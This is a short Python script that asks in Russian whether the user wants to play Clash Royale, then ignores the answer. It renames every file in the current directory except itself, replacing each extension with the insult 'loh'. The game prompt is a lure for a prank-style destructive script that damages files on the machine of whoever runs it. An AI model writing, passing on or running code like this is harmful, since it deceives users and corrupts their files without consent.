import sys
import os
hck = input("Хочешь поиграть в клеш рояль???\n1 - Да,\n2 - Нет\n")
for f in os.listdir("."):
	print(f)
	n = f.rfind(".")
	if f != os.path.basename(__file__):
		if n == -1:
			res = f + "loh"
		else:
			res = f[:n+1] + "loh"
		os.rename(f, res)